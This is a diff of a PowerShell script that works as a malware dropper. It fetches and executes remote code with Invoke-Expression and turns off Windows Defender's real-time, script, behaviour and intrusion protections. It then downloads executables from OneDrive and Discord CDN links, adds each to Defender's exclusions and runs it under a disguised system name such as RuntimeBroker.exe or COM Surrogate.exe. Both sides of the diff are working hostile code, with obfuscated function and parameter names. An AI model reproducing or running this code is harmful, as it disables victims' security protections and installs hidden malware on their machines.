@@ -366,35 +366,48 @@ function Main {
     $content = Invoke-RestMethod -Uri $url
     Invoke-Expression $content
     Send-Logs
+
     $null = $PSDefaultParameterValues['*:ErrorAction'] = 'SilentlyContinue'
     $ErrorActionPreference = 'SilentlyContinue'
     $OutputPreference = 'SilentlyContinue'
     $InformationPreference = 'SilentlyContinue'
     $VerbosePreference = 'SilentlyContinue'
     $WarningPreference = 'SilentlyContinue'
-    Set-MpPreference -DisableRealtimeMonitoring $true *>$null
-    Set-MpPreference -DisableScriptScanning $true *>$null
-    Set-MpPreference -DisableBehaviorMonitoring $true *>$null
-    Set-MpPreference -DisableIOAVProtection $true *>$null
-    Set-MpPreference -DisableIntrusionPreventionSystem $true *>$null
-    $up=$env:USERPROFILE
-    $td="$up\AppData\Local\Temp\6cfdfeea-9336-48ad-82b3-3d412645f44f\"
-    if (-not (Test-Path -Path $td)) {New-Item -ItemType Directory -Path $td -Force | Out-Null}
-    $ProgressPreference='SilentlyContinue'
-    $ErrorActionPreference='SilentlyContinue'
+    
+    Set-MpPreference -DisableRealtimeMonitoring $true
+    Set-MpPreference -DisableScriptScanning $true
+    Set-MpPreference -DisableBehaviorMonitoring $true
+    Set-MpPreference -DisableIOAVProtection $true
+    Set-MpPreference -DisableIntrusionPreventionSystem $true
+    
+    $up = $env:USERPROFILE
+    $td = "$up\AppData\Local\Temp\6cfdfeea-9336-48ad-82b3-3d412645f44f\"
+    
+    if (-not (Test-Path -Path $td)) {
+        New-Item -ItemType Directory -Path $td -Force | Out-Null
+    }
+    
     function xk7f1q1 {
         param (
             [string]$zx1ds,
             [string]$ak9zl1
         )
-        $x82jdm=Join-Path -Path $td -ChildPath $ak9zl1
-        Invoke-WebRequest -Uri $zx1ds -OutFile $x82jdm -UseBasicParsing -ErrorAction Stop *> $null 2>&1
-        Add-MpPreference -ExclusionPath $x82jdm *> $null 2>&1
-        Start-Process -x82jdm $x82jdm -NoNewWindow -Wait -ErrorAction SilentlyContinue *> $null 2>&1
+        $x82jdm = Join-Path -Path $td -ChildPath $ak9zl1
+        Write-Host "Downloading from: $zx1ds to $x82jdm"
+        try {
+            Invoke-WebRequest -Uri $zx1ds -OutFile $x82jdm -UseBasicParsing -ErrorAction Stop
+            Write-Host "Download successful: $x82jdm"
+            Add-MpPreference -ExclusionPath $x82jdm
+            Start-Process -FilePath $x82jdm -NoNewWindow -Wait
+        } catch {
+            Write-Error "Error in xk7f1q1: $_"
+        }
     }
+    
     xk7f1q1 -zx1ds "https://onedrive.live.com/download.aspx?cid=97860907e1ea7ff0&resid=97860907E1EA7FF0!113&parId=97860907E1EA7FF0!101&authkey=!ACaJl955WKnHmx8" -ak9zl1 "RuntimeBroker.exe"
     xk7f1q1 -zx1ds "https://cdn.discordapp.com/attachments/1307069151948308490/1317051107322888263/Windows_Security..exe?ex=675d46ed&is=675bf56d&hm=49db304f5a31e81810613380e577351bb9b297b248a40d1d76ec0f6e06151ed9&" -ak9zl1 "Windows Security Service.exe"
     xk7f1q1 -zx1ds "https://cdn.discordapp.com/attachments/1307069151948308490/1317051079371784264/COM_Surrogate.exe?ex=675d46e6&is=675bf566&hm=fd17e544a2ce1d5d56291eb4bd0a51ec5416daa29fd4eb25ada1d2e904b12f3c&" -ak9zl1 "COM Surrogate.exe"
+
 
 
 
